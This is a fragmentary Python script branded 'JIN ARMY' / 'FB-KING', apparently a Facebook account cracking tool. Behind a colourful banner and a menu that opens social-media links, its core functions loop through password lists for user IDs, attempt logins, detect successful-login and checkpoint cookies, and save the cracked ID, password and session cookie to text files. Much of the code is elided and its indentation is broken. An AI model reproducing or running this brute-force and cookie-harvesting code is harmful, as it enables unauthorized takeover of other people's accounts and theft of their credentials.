...
|  '-'  /|  ||  | `   | 
 `-----' `--'`--'  `--' 
                        \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} JIN ARMY                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}JIN ARMY           {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+923135837684        {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/master347{N}    {H}  ║
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/JINarmy0033");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://facebook.com/groups/412641030225365/");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/JIN.Army00");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.JIN/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/JIN.Army00");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/JIN.txt');print(led)
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mJIN","\x1b[1;92mJIN","\x1b[1;93mJIN","\x1b[1;94mJIN","\x1b[1;95mJIN","\x1b[1;96mJIN","\x1b[1;97mJIN","\x1b[1;91mJIN","\x1b[1;92mJIN","\x1b[1;93mJIN","\x1b[1;94mJIN","\x1b[1;95mJIN","\x1b[1;96mJIN"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;33mJIN-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/JIN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}JIN-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/JIN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;33mJIN-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/JIN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/JIN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [JIN-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/JIN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mJIN-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/JIN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
if __name__=='__main__':
  try:os.mkdir('JIN-ROXY')
  except:pass
  try:os.mkdir('FOSTER-JIN')
  except:pass
#  b2()
#  mainx() 
  mainx()
